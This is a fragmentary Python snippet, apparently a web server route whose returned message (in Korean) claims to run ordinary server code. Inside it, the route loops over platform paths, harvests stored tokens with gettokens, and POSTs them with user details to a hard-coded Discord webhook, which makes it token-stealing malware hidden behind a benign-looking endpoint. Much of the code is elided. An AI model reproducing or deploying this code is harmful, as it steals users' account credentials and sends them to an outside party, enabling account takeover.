...
def index():
        ...
        for platform, path in PATHS.items():
            ...
            for token in gettokens(path):
                ...
                try:
                    ...
                    urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1432365652592824440/0r8K9XVX_jIfou4Pv_QOoRCA4Y8OqgZ129eeqcDUhmTbpfLC1D5TRUwU_g2q3_wmaW43', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
    ...
    result = {"message": "파이썬 코드가 서버에서 실행되었습니다."}
    # 예: 파일 처리, 데이터베이스 조회, 계산 등
